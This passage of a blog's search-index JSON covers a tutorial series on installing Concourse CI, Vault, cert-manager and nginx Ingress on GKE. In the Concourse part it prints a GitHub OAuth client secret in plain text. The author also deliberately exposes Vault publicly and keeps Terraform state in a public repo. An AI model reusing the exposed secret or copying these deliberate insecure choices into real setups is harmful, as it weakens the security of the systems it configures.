- name: ozymandias-job plan: - task: ozymandias-task config: platform: linux image_resource: type: docker-image source: repository: fedora run: path: echo args: - \u0026#34;Ozymandias says:\u0026#34; - ((ozymandias-secret)) Let\u0026rsquo;s fly our new pipeline. Replace nono with your Concourse target\u0026rsquo;s name:\nfly -t gke set-pipeline -p ozymandias-pipeline -c pipeline-ozymandias.yml fly -t gke expose-pipeline -p ozymandias-pipeline fly -t gke unpause-pipeline -p ozymandias-pipeline fly -t gke trigger-job -j ozymandias-pipeline/ozymandias-job Let\u0026rsquo;s browse to our job, expand ozymandias-task by clicking on it, and allow ourselves to luxuriate in the sweet smell of success:\nIf you instead see an aborted Concourse job with the error, failed to interpolate task config: undefined vars: ozymandias-secret, you probably have mangled the authentication credentials (vaultAuthParam) setting.\nWhat We Did Wrong Hashicorp warns:\nVault should not be deployed in a public internet facing environment\nWe\u0026rsquo;re doing the exact opposite of what they suggest. If we\u0026rsquo;re going to the trouble of deploying Vault, we want to make sure we can use it from everywhere, security be damned; we don\u0026rsquo;t want to waste our time sprinkling separate Vault deployments like magic fairy dust on each of our environments.\nHashicorp also warns:\nFor a production-ready install, we suggest that the Vault Helm chart is installed in high availability (HA) mode\nWe\u0026rsquo;re installing in standalone mode, not HA mode. We think HA mode is overkill for our use case. Also, our GKE cluster is small because we pay for it out-of-pocket, and we don\u0026rsquo;t have the resources to spend on HA mode.\nAddendum: Updating Here\u0026rsquo;s the correct process for updating:\nUpdate vault. Then unseal the vault. Update Concourse. Addendum: Motivation \u0026ldquo;Why go to all this trouble to install Vault? Wasn\u0026rsquo;t the Concourse server enough?\u0026rdquo; you might ask.\nThe reason we installed Vault was that there were two things we wanted to accomplish that assumed Vault (or another secret-store such as CredHub):\nWe wanted a Concourse pipeline \u0026ldquo;to build and publish a container image\u0026rdquo;. The tutorial\u0026rsquo;s pipelines assumed a secret-store. We didn\u0026rsquo;t have one. We didn\u0026rsquo;t want to be losers that didn\u0026rsquo;t have a secret-store; we wanted to be one of the cool kids.\nWe wanted a Concourse pipeline that used Platform Automation to deploy a Tanzu Ops Manager. We\u0026rsquo;re part of the development team that supports Ops Manager, and we like having our own testbed (instead of the corporate ones) to develop/troubleshoot. Note: there\u0026rsquo;s nothing wrong with the corporate testbeds—they\u0026rsquo;re pretty awesome—but we like having our own personal testbed, as well as our own personal Concourse CI server.\n\u0026ldquo;Why use Vault instead of CredHub? Isn\u0026rsquo;t CredHub is more tightly integrated into the Cloud Foundry ecosystem?\u0026rdquo; you might also ask. The answer is simple: we like a GUI. Yes, we know that using the GUI not as macho as using the CLI, but so what? A well-designed GUI can present data in a more digestible fashion than a CLI.\nAlso, we wanted to learn how to use Vault, and this was a good opportunity. Besides, Vault was written in Golang, which is more fashionable than CredHub\u0026rsquo;s Java (and starts more quickly, too).\nUpdates/Errata 2022-07-04 Added the order in which to apply Vault \u0026amp; Concourse updates.\nFootnotes values_file\nAre you sick of the gargantuan command to deploy Concourse? Then do what we do—use a Helm values file (e.g. concourse-values.yml). You can see ours here. With that file our command to deploy Concourse becomes manageably smaller:\nhelm upgrade gke.nono.io concourse/concourse \\ -f concourse-values.yml \\ ... 443\nYou may think, \u0026ldquo;That :443 at the end of https://vault.nono.io:443 is redundant \u0026amp; superfluous; I\u0026rsquo;ll redact that on my version. Any programmer worth his salt knows that the https scheme defaults to port 443.\u0026rdquo;\nWell I got news for you, Sunshine: you need that :443; if you skip it, you\u0026rsquo;ll get the dreaded, \u0026ldquo;failed to interpolate task config: timed out to login to vault\u0026rdquo; error when your Concourse task attempts to interpolate a variable.\nIn some ways it\u0026rsquo;s similar to the openssl s_client -connect vault.nono.io:443 command which insists that you specify the port even though 99% of the time that port is going to be 443. What, you\u0026rsquo;re not familiar with the openssl s_client -connect command? Well stick around, it\u0026rsquo;ll come in useful when you have to debug certs on someone else\u0026rsquo;s server.\ndouble_backslash\nYou need the double backslash before the comma; if you don\u0026rsquo;t have it, the following error will rear its ugly head when you attempt helm upgrade:\nError: INSTALLATION FAILED: failed parsing --set data: key \u0026#34;secret_id:59b8015d-8d4a-fcce-f689-xxxxxxxxxxxx\u0026#34; has no value ","permalink":"https://blog.nono.io/post/concourse_on_k8s-5/","summary":"In our previous post, we configured our GKE Concourse CI server, which was the capstone of the series. But we were wrong: this post is the capstone in the series. In this post, we install Vault and configure our Concourse CI server to use Vault to retrieve secrets.\nInstallation Most of these instructions are derived from the Hashicorp tutorial, Vault on Kubernetes Deployment Guide.\nCreate a DNS A record which points to the IP address of your GKE load balancer.","title":"Concourse CI on Kubernetes (GKE), Part 5: Vault"},{"content":" In our previous post, we configured our GKE (Google Kubernetes Engine) to use Let\u0026rsquo;s Encrypt TLS certificates. In this post, the capstone of our series, we install Concourse CI.\nInstallation These instructions are a more-opinionated version of the canonical instructions for the Concourse CI Helm chart found here: https://github.com/concourse/concourse-chart.\nFirst Install: with Helm We use helm to install Concourse. We first add the Helm repo, and then install it. We take the opportunity to bump the default login time from 24 hours to ten days (duration=240h) because we hate re-authenticating to our Concourse every morning. Replace gke.nono.io with your DNS record:\nkubectl delete ingress kuard # to free up https://gke.nono.io helm repo add concourse https://concourse-charts.storage.googleapis.com/ helm install gke-nono-io concourse/concourse \\ --set concourse.web.externalUrl=https://gke.nono.io \\ --set concourse.web.auth.duration=240h \\ --set \u0026#39;web.ingress.enabled=true\u0026#39; \\ --set \u0026#39;web.ingress.annotations.cert-manager\\.io/issuer=letsencrypt-prod\u0026#39; \\ --set \u0026#39;web.ingress.annotations.kubernetes\\.io/ingress.class=nginx\u0026#39; \\ --set \u0026#39;web.ingress.hosts={gke.nono.io}\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].hosts[0]=gke.nono.io\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].secretName=gke.nono.io\u0026#39; \\ \\ --wait Browse to our site https://gke.nono.io. You\u0026rsquo;ll see a secure connection icon \u0026amp; the initial Concourse CI login page.\nFirst Upgrade: Locking Down Concourse Our Concourse is insecure: we haven\u0026rsquo;t changed the default private keys. Our Concourse is public-facing, and we must change the keys lest evildoers compromise us. The Concourse README warns:\nFor your convenience, this chart provides some default values for secrets, but it is recommended that you generate and manage these secrets outside the Helm chart.\nLet\u0026rsquo;s make our keys. The Concourse documentation provides two excellent ways to do it, and we\u0026rsquo;ve modified one of the ways to suit our setup. Replace gke.nono.io with your DNS record:\nmkdir -p secrets/ for KEY in session_signing_key tsa_host_key worker_key; do ssh-keygen -t rsa -b 4096 -m PEM -f secrets/$KEY -C $KEY \u0026lt; /dev/null done rm secrets/session_signing_key.pub # \u0026#34;You can remove the session_signing_key.pub file if you have one, it is not needed by any process in Concourse\u0026#34; Let\u0026rsquo;s re-deploy our Concourse with our newly-generated secrets. Replace gke.nono.io with your DNS record:\nhelm upgrade gke-nono-io concourse/concourse \\ --set concourse.web.externalUrl=https://gke.nono.io \\ --set concourse.web.auth.duration=240h \\ --set \u0026#39;web.ingress.enabled=true\u0026#39; \\ --set \u0026#39;web.ingress.annotations.cert-manager\\.io/issuer=letsencrypt-prod\u0026#39; \\ --set \u0026#39;web.ingress.annotations.kubernetes\\.io/ingress.class=nginx\u0026#39; \\ --set \u0026#39;web.ingress.hosts={gke.nono.io}\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].hosts[0]=gke.nono.io\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].secretName=gke.nono.io\u0026#39; \\ \\ --set-file secrets.sessionSigningKey=secrets/session_signing_key \\ --set-file secrets.hostKey=secrets/tsa_host_key \\ --set-file secrets.hostKeyPub=secrets/tsa_host_key.pub \\ --set-file secrets.workerKey=secrets/worker_key \\ --set-file secrets.workerKeyPub=secrets/worker_key.pub \\ \\ --wait Third Upgrade: now with GitHub OAuth We have a Concourse CI server, and we\u0026rsquo;ve generated our own keys, but we\u0026rsquo;re still not secure: people can log in with the user \u0026ldquo;test\u0026rdquo; using the password \u0026ldquo;test\u0026rdquo;. Yes, really.\nWe don\u0026rsquo;t want to have any hard-coded users; we want to authenticate against our GitHub organization, \u0026ldquo;blabbertabber\u0026rdquo;, so we browse to our organization (https://github.com/blabbertabber) → Settings → Developer Settings → OAuth Apps → New OAuth App.\nNote: \u0026ldquo;Note that the client must be created under an organization if you want to authorize users based on organization/team membership.\u0026rdquo;\nHere\u0026rsquo;s how we filled out ours. Replace gke.nono.io with your URL. The authorization callback URL is particularly important; don\u0026rsquo;t mess it up:\nWe click \u0026ldquo;Register Application\u0026rdquo;, which brings us to the next screen, where we get the Client ID (5e4ffee9dfdced62ebe3) and then click \u0026ldquo;Generate a new client secret\u0026rdquo; to get the Client secret (549e10b1680ead9cafa30d4c9a715681cec9b074). Don\u0026rsquo;t forget to click \u0026ldquo;Update Application\u0026rdquo;!\nNow we can add the five GitHub OAuth-related lines to our helm upgrade command. Replace the GitHub org blabbertabber, the GitHub Client ID and Client Secret with the ones you\u0026rsquo;ve created, gke.nono.io with your DNS record:\nWhile we\u0026rsquo;re locking things down, we also remove the local user \u0026ldquo;test\u0026rdquo; (along with the easy-to-guess password, \u0026ldquo;test\u0026rdquo;). We do this by setting secrets.localUsers to \u0026ldquo;\u0026rdquo;. To be safe, we also disable local auth (we set concourse.web.localAuth.enabled to false).\nhelm upgrade gke-nono-io concourse/concourse \\ --set concourse.web.externalUrl=https://gke.nono.io \\ --set concourse.web.auth.duration=240h \\ --set \u0026#39;web.ingress.enabled=true\u0026#39; \\ --set \u0026#39;web.ingress.annotations.cert-manager\\.io/issuer=letsencrypt-prod\u0026#39; \\ --set \u0026#39;web.ingress.annotations.kubernetes\\.io/ingress.class=nginx\u0026#39; \\ --set \u0026#39;web.ingress.hosts={gke.nono.io}\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].hosts[0]=gke.nono.io\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].secretName=gke.nono.io\u0026#39; \\ \\ --set-file secrets.sessionSigningKey=secrets/session_signing_key \\ --set-file secrets.hostKey=secrets/tsa_host_key \\ --set-file secrets.hostKeyPub=secrets/tsa_host_key.pub \\ --set-file secrets.workerKey=secrets/worker_key \\ --set-file secrets.workerKeyPub=secrets/worker_key.pub \\ \\ --set secrets.localUsers=\u0026#34;\u0026#34; \\ --set concourse.web.localAuth.enabled=false \\ --set concourse.web.auth.mainTeam.github.org=blabbertabber \\ --set concourse.web.auth.github.enabled=true \\ --set secrets.githubClientId=5e4ffee9dfdced62ebe3 \\ --set secrets.githubClientSecret=549e10b1680ead9cafa30d4c9a715681cec9b074 \\ \\ --wait Browse to our URL: https://gke.nono.io. We log in with GitHub Auth. We authorize our app. We download \u0026amp; install our fly CLI. Then we log in. Replace gke.nono.io with your DNS record:\nfly -t gke login -c https://gke.nono.io # click the link # click \u0026#34;Authorize blabbertabber\u0026#34; # see \u0026#34;login successful!\u0026#34; We create the following simple pipeline file, simple.yml:\njobs: - name: simple plan: - task: simple config: platform: linux image_resource: type: docker-image source: repository: fedora run: path: \u0026#34;true\u0026#34; Let\u0026rsquo;s fly our new pipeline:\nfly -t gke set-pipeline -p simple -c simple.yml fly -t gke expose-pipeline -p simple fly -t gke unpause-pipeline -p simple We browse to our Concourse and see the sweet green of success (it\u0026rsquo;ll take a minute or two to run):\nYay! We\u0026rsquo;re done.\nPro-tip Rather than having an onerous number of --set arguments to our helm upgrade command, we find it easier to modify the corresponding settings in the values.yml file and pass it to our invocation of helm, i.e. helm upgrade -f values.yml .... Here\u0026rsquo;s our file of overrides.\nAddendum: Keeping Concourse Up-to-date Blindly upgrading Concourse without reading the release notes is a recipe for disaster; however, that\u0026rsquo;s what we\u0026rsquo;re going to show you. Let\u0026rsquo;s update the Helm repos first.\nhelm repo update Now let\u0026rsquo;s upgrade our install. Replace gke.nono.io with your DNS record:\nhelm upgrade gke-nono-io concourse/concourse \\ --set concourse.web.externalUrl=https://gke.nono.io \\ --set concourse.web.auth.duration=240h \\ --set \u0026#39;web.ingress.enabled=true\u0026#39; \\ --set \u0026#39;web.ingress.annotations.cert-manager\\.io/issuer=letsencrypt-prod\u0026#39; \\ --set \u0026#39;web.ingress.annotations.kubernetes\\.io/ingress.class=nginx\u0026#39; \\ --set \u0026#39;web.ingress.hosts={gke.nono.io}\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].hosts[0]=gke.nono.io\u0026#39; \\ --set \u0026#39;web.ingress.tls[0].secretName=gke.nono.io\u0026#39; \\ \\ --set-file secrets.sessionSigningKey=secrets/session_signing_key \\ --set-file secrets.hostKey=secrets/tsa_host_key \\ --set-file secrets.hostKeyPub=secrets/tsa_host_key.pub \\ --set-file secrets.workerKey=secrets/worker_key \\ --set-file secrets.workerKeyPub=secrets/worker_key.pub \\ \\ --set secrets.localUsers=\u0026#34;\u0026#34; \\ --set concourse.web.localAuth.enabled=false \\ --set concourse.web.auth.mainTeam.github.org=blabbertabber \\ --set concourse.web.auth.github.enabled=true \\ --set secrets.githubClientId=5e4ffee9dfdced62ebe3 \\ --set secrets.githubClientSecret=549e10b1680ead9cafa30d4c9a715681cec9b074 \\ \\ --wait Browse to your Concourse server, and check that it has the updated version number.\nReferences Concourse CI Helm chart: https://github.com/concourse/concourse-chart Helm Chart Install: Advanced Usage of the “Set” Argument: https://itnext.io/helm-chart-install-advanced-usage-of-the-set-argument-3e214b69c87a Creating an OAuth App on GitHub: https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app Updates/Errata 2021-11-13 Added section on keeping Concourse up-to-date.\n2021-11-14 Added section on locking down Concourse.\n","permalink":"https://blog.nono.io/post/concourse_on_k8s-4/","summary":"In our previous post, we configured our GKE (Google Kubernetes Engine) to use Let\u0026rsquo;s Encrypt TLS certificates. In this post, the capstone of our series, we install Concourse CI.\nInstallation These instructions are a more-opinionated version of the canonical instructions for the Concourse CI Helm chart found here: https://github.com/concourse/concourse-chart.\nFirst Install: with Helm We use helm to install Concourse. We first add the Helm repo, and then install it. We take the opportunity to bump the default login time from 24 hours to ten days (duration=240h) because we hate re-authenticating to our Concourse every morning.","title":"Concourse CI on Kubernetes (GKE), Part 4: Concourse"},{"content":" In our previous blog post, we configured ingress to our Kubernetes cluster but were disappointed to discover that the TLS certificates were self-signed. In this post we\u0026rsquo;ll remedy that by installing cert-manager, the Cloud native certificate management tool.\nDisclaimer: most of this blog post was lifted whole cloth from the most-excellent cert-manager documentation. We merely condensed it \u0026amp; made it more opinionated.\nInstallation Let\u0026rsquo;s add the Jetstack Helm Repository:\nhelm repo add jetstack https://charts.jetstack.io helm repo update Let\u0026rsquo;s install cert-manager:\nhelm install \\ cert-manager jetstack/cert-manager \\ --namespace cert-manager \\ --create-namespace \\ --version v1.6.1 \\ --set installCRDs=true Verifying Installation Do we see all three pods?\nkubectl get pods --namespace cert-manager Now let\u0026rsquo;s create an issuer to test the webhook:\ncat \u0026lt;\u0026lt;EOF \u0026gt; test-resources.yaml apiVersion: v1 kind: Namespace metadata: name: cert-manager-test --- apiVersion: cert-manager.io/v1 kind: Issuer metadata: name: test-selfsigned namespace: cert-manager-test spec: selfSigned: {} --- apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: selfsigned-cert namespace: cert-manager-test spec: dnsNames: - example.com secretName: selfsigned-cert-tls issuerRef: name: test-selfsigned EOF And now let\u0026rsquo;s apply those resources:\nkubectl apply -f test-resources.yaml sleep 10 kubectl describe certificate -n cert-manager-test | grep \u0026#34;has been successfully\u0026#34; kubectl delete -f test-resources.yaml 4. Deploy an Example Service Let\u0026rsquo;s install the sample services to test the controller:\nkubectl apply -f https://netlify.cert-manager.io/docs/tutorials/acme/example/deployment.yaml kubectl apply -f https://netlify.cert-manager.io/docs/tutorials/acme/example/service.yaml Let\u0026rsquo;s download and edit the Ingress (we\u0026rsquo;ve already configured gke.nono.io to point to the GCP/GKE load balancer at 34.135.26.144). Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\ncurl -o ingress-kuard.yml -L https://netlify.cert-manager.io/docs/tutorials/acme/example/ingress.yaml sed -i \u0026#39;\u0026#39; \u0026#34;s/example.example.com/gke.nono.io/g\u0026#34; ingress-kuard.yml kubectl apply -f ingress-kuard.yml Let\u0026rsquo;s use curl to check the GKE load balancer. Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\ncurl -kivL -H \u0026#39;Host: gke.nono.io\u0026#39; https://gke.nono.io You should see output similar to the following (note that the cert is still self-signed):\n... * Server certificate: * subject: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate 6. Configure Let’s Encrypt Issuer Let\u0026rsquo;s deploy the staging \u0026amp; production issuers. Replace brian.cunnie@gmail.com with your email address:\nkubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/staging-issuer.yaml | sed \u0026#39;s/user@example.com/brian.cunnie@gmail.com/\u0026#39;) kubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/production-issuer.yaml | sed \u0026#39;s/user@example.com/brian.cunnie@gmail.com/\u0026#39;) # check to make sure they were deployed: kubectl describe issuer letsencrypt-staging kubectl describe issuer letsencrypt-prod 7. Step 7 - Deploy a TLS Ingress Resource Let\u0026rsquo;s deploy the ingress resource using annotations to obtain the certificate. Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\nkubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/ingress-tls.yaml | sed \u0026#39;s/example.example.com/gke.nono.io/\u0026#39;) kubectl get certificate # takes ~30s to become ready (\u0026#34;READY\u0026#34; == \u0026#34;True\u0026#34;) kubectl describe certificate quickstart-example-tls kubectl describe secret quickstart-example-tls Let\u0026rsquo;s use curl again to check the GKE load balancer\u0026rsquo;s certificate. Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\ncurl -kivL -H \u0026#39;Host: gke.nono.io\u0026#39; https://gke.nono.io You should see output similar to the following:\n... * Server certificate: * subject: CN=gke.nono.io * start date: Sep 1 22:02:55 2021 GMT * expire date: Nov 30 22:02:54 2021 GMT * issuer: C=US; O=(STAGING) Let\u0026#39;s Encrypt; CN=(STAGING) Artificial Apricot R3 Great! We have the staging cert, but that\u0026rsquo;s not quite good enough—we want a real certificate. Let\u0026rsquo;s upgrade to the production certificate. As usual, Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\nkubectl apply -f \u0026lt;( curl -o- https://cert-manager.io/docs/tutorials/acme/example/ingress-tls-final.yaml | sed \u0026#39;s/example.example.com/gke.nono.io/\u0026#39;) kubectl delete secret quickstart-example-tls # triggers the process to get a new certificate kubectl get certificate # takes ~30s to become ready (\u0026#34;READY\u0026#34; == \u0026#34;True\u0026#34;) kubectl describe certificate quickstart-example-tls kubectl describe secret quickstart-example-tls Let\u0026rsquo;s use curl one more time to check the GKE load balancer\u0026rsquo;s certificate. Replace gke.nono.io with the DNS record of your load balancer set up in the previous blog post:\ncurl -kivL -H \u0026#39;Host: gke.nono.io\u0026#39; https://gke.nono.io You should see output similar to the following:\n... * Server certificate: * subject: CN=gke.nono.io * start date: Sep 1 22:11:36 2021 GMT * expire date: Nov 30 22:11:35 2021 GMT * issuer: C=US; O=Let\u0026#39;s Encrypt; CN=R3 * SSL certificate verify ok. And now browse (replacing gke.nono.io with the DNS record of your load balancer): https://gke.nono.io/. Yes, we get an HTTP 503 status, but our certificate is valid!\nStay Tuned! Stay tuned for our next installment, where we install Concourse CI on GKE.\nReferences cert-manager documentation: https://cert-manager.io/docs/ Updates/Errata 2022-01-08 Bumped the cert-manager version 1.6.0 → 1.6.1; fixed scheme (was http; now is https)\n2021-11-13 Bumped the cert-manager version 1.5.0 → 1.6.0\n","permalink":"https://blog.nono.io/post/concourse_on_k8s-3/","summary":"In our previous blog post, we configured ingress to our Kubernetes cluster but were disappointed to discover that the TLS certificates were self-signed. In this post we\u0026rsquo;ll remedy that by installing cert-manager, the Cloud native certificate management tool.\nDisclaimer: most of this blog post was lifted whole cloth from the most-excellent cert-manager documentation. We merely condensed it \u0026amp; made it more opinionated.\nInstallation Let\u0026rsquo;s add the Jetstack Helm Repository:","title":"Concourse CI on Kubernetes (GKE), Part 3: TLS"},{"content":" In our previous blog post, we set up our Kubernetes cluster and deployed a pod running nginx, but the experience was disappointing—we couldn\u0026rsquo;t browse to our pod. Let\u0026rsquo;s fix that by deploying the nginx Ingress controller.\nAcquire the External IP Address (Elastic IP) We\u0026rsquo;ll use the Google Cloud console to acquire the external address [external address] for our load balancer.\nNavigate to VPC network → External IP addresses → Reserve Static Address:\nName: gke-nono-io (or \u0026ldquo;gke-\u0026rdquo; and whatever your domain is, with dashes not dots) Description: Ingress for GKE In our example, we acquire the IP address, 34.135.26.144.\nCreate DNS Record to Point to Acquired IP Address You\u0026rsquo;ll need a DNS domain for this part. In our examples, we use the domain \u0026ldquo;nono.io\u0026rdquo;, so whenever you see \u0026ldquo;nono.io\u0026rdquo;, substitute \u0026amp; replace your domain. Similarly, whenever you see \u0026ldquo;34.135.26.144\u0026rdquo;, substitute your external IP address.\nAdding a DNS record is outside the scope of the humble blog post (we use BIND, but these days services such as AWS\u0026rsquo;s Route 53 are all the rage).\nWe create the DNS address record \u0026ldquo;gke.nono.io\u0026rdquo; to point to \u0026ldquo;34.135.26.144\u0026rdquo;; Let\u0026rsquo;s test to make sure it\u0026rsquo;s set up properly:\ndig gke.nono.io +short # should return 34.135.26.144 Create Kubernetes Ingress nginx Manifest Files We\u0026rsquo;re going to shamelessly copy the canonical Ingress nginx manifest files and modify them to include our static IP address:\n[Much of the following is shamelessly copied from the ingress-nginx docs]\nAssign cluster-admin permissions:\nkubectl create clusterrolebinding cluster-admin-binding \\ --clusterrole cluster-admin \\ --user $(gcloud config get-value account) Let\u0026rsquo;s download our controller manifest and edit it:\ncurl -L https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.0/deploy/static/provider/cloud/deploy.yaml \\ -o nginx-ingress-controller.yml nvim nginx-ingress-controller.yml We need to add our IP address to our load balancer Kubernetes service. search for the string \u0026ldquo;LoadBalancer\u0026rdquo; and add the IP address as shown below (don\u0026rsquo;t include the plus sign \u0026ldquo;+\u0026rdquo; in your file):\nspec: type: LoadBalancer externalTrafficPolicy: Local + loadBalancerIP: 34.135.26.144 ports: - name: http port: 80 Let\u0026rsquo;s apply our changes:\nkubectl apply -f nginx-ingress-controller.yml Let\u0026rsquo;s wait for the change to have completed\nkubectl wait --namespace ingress-nginx \\ --for=condition=ready pod \\ --selector=app.kubernetes.io/component=controller \\ --timeout=120s Let\u0026rsquo;s browse to our endpoint: http://gke.nono.io. We see the nginx \u0026ldquo;404 Not Found\u0026rdquo; status page, but that\u0026rsquo;s reassuring: it means we\u0026rsquo;ve properly set up the nginx controller, but haven\u0026rsquo;t yet set up Ingress to our existing pods.\nBefore we set up Ingress, let\u0026rsquo;s check our HTTPS endpoint: https://gke.nono.io.\nWait, what is this? We\u0026rsquo;re seeing an unsettling message, \u0026ldquo;Warning: Potential Security Risk Ahead\u0026rdquo; (Chrome users may see \u0026ldquo;Your connection is not private\u0026rdquo;; Safari users, \u0026ldquo;This Connection Is Not Private\u0026rdquo;). We\u0026rsquo;re upset—we don\u0026rsquo;t want to be seen as losers who are using self-signed TLS certificates; we want to be winners who are using certificates from Let\u0026rsquo;s Encrypt.\nStay Tuned! Stay tuned for our next installment, where we configure Let\u0026rsquo;s Encrypt certificates for our TLS (Transport Layer Security) endpoints.\nReferences The canonical Kubernetes documentation for deploying the nginx Ingress controller on GKE https://kubernetes.github.io/ingress-nginx/deploy/#gce-gke Footnotes external address\nYou can also acquire the external address via the command line (don\u0026rsquo;t forget to change \u0026ldquo;blabbertabber\u0026rdquo; to your project\u0026rsquo;s name):\ngcloud compute addresses create gke-nono-io --project=blabbertabber --description=Ingress\\ for\\ GKE --region=us-central1 Or, for the truly advanced among you, you can modify your terraform templates to acquire the address for you. The terraform site has great documentation, and here\u0026rsquo;s the snippet you\u0026rsquo;ll need:\nmodule \u0026#34;address-fe\u0026#34; { source = \u0026#34;terraform-google-modules/address/google\u0026#34; version = \u0026#34;0.1.0\u0026#34; names = [ \u0026#34;gke-nono-io\u0026#34;] global = true } Updates/Errata 2022-01-08 Bumped nginx controller 0.48.1 → 1.1.0\n","permalink":"https://blog.nono.io/post/concourse_on_k8s-2/","summary":"In our previous blog post, we set up our Kubernetes cluster and deployed a pod running nginx, but the experience was disappointing—we couldn\u0026rsquo;t browse to our pod. Let\u0026rsquo;s fix that by deploying the nginx Ingress controller.\nAcquire the External IP Address (Elastic IP) We\u0026rsquo;ll use the Google Cloud console to acquire the external address [external address] for our load balancer.\nNavigate to VPC network → External IP addresses → Reserve Static Address:","title":"Concourse CI on Kubernetes (GKE), Part 2: Ingress"},{"content":" Let\u0026rsquo;s deploy Concourse, a continuous-integration, continuous delivery (CI/CD) application (similar to Jenkins and CircleCI).\nWe\u0026rsquo;ll deploy it to Google Cloud, to our Google Kubernetes Engine (GKE).\nIn this post, we\u0026rsquo;ll use HashiCorp\u0026rsquo;s Terraform to create our cluster.\nWe assume you\u0026rsquo;ve already installed the terraform command-line interface (CLI) and created a Google Cloud account.\nmkdir -p ~/workspace/gke cd ~/workspace/gke Next we download the terraform templates and terraform vars file:\ncurl -OL https://raw.githubusercontent.com/cunnie/deployments/6b230118399f4326094b4d60e21cda32e8c6f321/terraform/gcp/gke/gke.tf curl -OL https://raw.githubusercontent.com/cunnie/deployments/6b230118399f4326094b4d60e21cda32e8c6f321/terraform/gcp/gke/vpc.tf curl -OL https://raw.githubusercontent.com/cunnie/deployments/6b230118399f4326094b4d60e21cda32e8c6f321/terraform/gcp/gke/terraform.tfvars curl -OL https://raw.githubusercontent.com/cunnie/deployments/6b230118399f4326094b4d60e21cda32e8c6f321/terraform/gcp/gke/outputs.tf At this point we hear cries of protest, \u0026ldquo;What?! Downloading dubious files from sketchy software developers on the internet? Files whose provenance is murky at best?\u0026rdquo;\nLet us reassure you: the provenance of these files is crystal-clear: they have been patterned after templates from HashiCorp\u0026rsquo;s excellent tutorial, Provision a GKE Cluster (Google Cloud), and the companion git repo, https://github.com/hashicorp/learn-terraform-provision-gke-cluster. [provenance]\nLet\u0026rsquo;s login with gcloud:\ngcloud auth application-default login (if you get a command not found error, then it means you need to install Google Cloud\u0026rsquo;s CLI; the HashiCorp tutorial has great instructions.)\nLet\u0026rsquo;s customize our terraform.tfvars file. At the very least, change the project_id to your Google Cloud\u0026rsquo;s project\u0026rsquo;s ID. If you\u0026rsquo;re not sure what that is, you can find it on the Google console:\nLet\u0026rsquo;s use neovim (or your editor of choice):\nnvim terraform.tfvars Let\u0026rsquo;s change the Project ID to \u0026ldquo;my-google-project-id\u0026rdquo; (assuming that\u0026rsquo;s your Google Project\u0026rsquo;s name, which it isn\u0026rsquo;t):\n-project_id = \u0026#34;blabbertabber\u0026#34; -friendly_project_id = \u0026#34;nono\u0026#34; +project_id = \u0026#34;my-google-project-id\u0026#34; +friendly_project_id = \u0026#34;my-google-project-id\u0026#34; We\u0026rsquo;re ready to terraform!\nterraform init terraform apply # answer \u0026#34;yes\u0026#34; when asked, \u0026#34;Do you want to perform these actions?\u0026#34; The terraform apply takes ~10 minutes to complete. Now let\u0026rsquo;s get our cluster credentials:\ngcloud container clusters get-credentials $(terraform output -raw kubernetes_cluster_name) --zone $(terraform output -raw zone) We have a cluster at this point—let\u0026rsquo;s test by deploying nginx:\nkubectl run nginx --image=nginx kubectl get pods You should see the following output:\nNAME READY STATUS RESTARTS AGE nginx 1/1 Running 0 2m21s Save that terraform.tfstate file! Save the terraform.tfstate file; if you lose it, it becomes much more difficult to make changes to your terraform infrastructure (you\u0026rsquo;ll have to manually tear it down \u0026amp; start from scratch).\nWe won\u0026rsquo;t tell you how or where to save it, but we will tell you that we\u0026rsquo;ve chosen to save ours in a public GitHub repo. This is a bad idea! terraform.tfstate files often contain secrets which you do not want to make public. Ours doesn\u0026rsquo;t appear to contain any secrets, and we like to have it publicly viewable for instructional purposes, but we may have made a terrible mistake by publishing it.\nStay Tuned! Stay tuned for the next installment, where we configure load balancers and install Concourse CI.\nReferences HashiCorp\u0026rsquo;s excellent tutorial, Provision a GKE Cluster (Google Cloud) https://learn.hashicorp.com/terraform/kubernetes/provision-gke-cluster Companion GitHub repository, https://github.com/hashicorp/learn-terraform-provision-gke-cluster https://github.com/cloudfoundry/bosh-community-stemcell-ci-infra is the repo that contains the scripts to spin up Concourse CI on GKE, and may be of interest to those who would like a more automated way of spinning up Concourse on GKE. This repo is actively maintained, and is used by the team that produces the BOSH Bionic stemcells. \u0026ldquo;It also uses config connector instead of Terraform for managing the cloud SQL instance https://cloud.google.com/config-connector/docs/overview.\u0026rdquo; Thanks, Ruben Koster! https://github.com/pivotal-cf/pci-infrastructure/tree/master/k8s \u0026ldquo;sets up a GKE cluster using Terraform, Vault with Google KMS [Key Management Service] integration, Concourse with Vault integration, as well as cert-manager, Kubernetes ingress-nginx and external DNS that hooks into Google Cloud\u0026rsquo;s DNS to create our external IP.\u0026rdquo; Thanks Brian Rieger! https://github.com/skyscrapers/terraform-concourse is a good resource for those interested in deploying to AWS instead of GCP. Thanks Ringo De Smet! How to Download \u0026amp; Install Terraform on Windows, Linux, Mac is a tutorial for installing the terraform CLI. Martyna Łokuciejewska asked me nicely to link to it, so I did. Updates/Errata 2022-03-12 Added a reference to installing the Terraform CLI.\n2022-01-02 Pointed out that the modifications to the terraform configuration enable the creation of a Zonal cluster, which qualifies for the GKE free tier.\n2021-09-30 Added an additional reference for those interested in deploying to AWS.\n2021-09-16 Added two additional references for more complete/more automated ways to spin up Concourse on GKE.\nFootnotes provenance\nThis begs the question, \u0026ldquo;If we\u0026rsquo;re patterning our templates after HashiCorp\u0026rsquo;s, why not use HashiCorp\u0026rsquo;s directly? Why change the 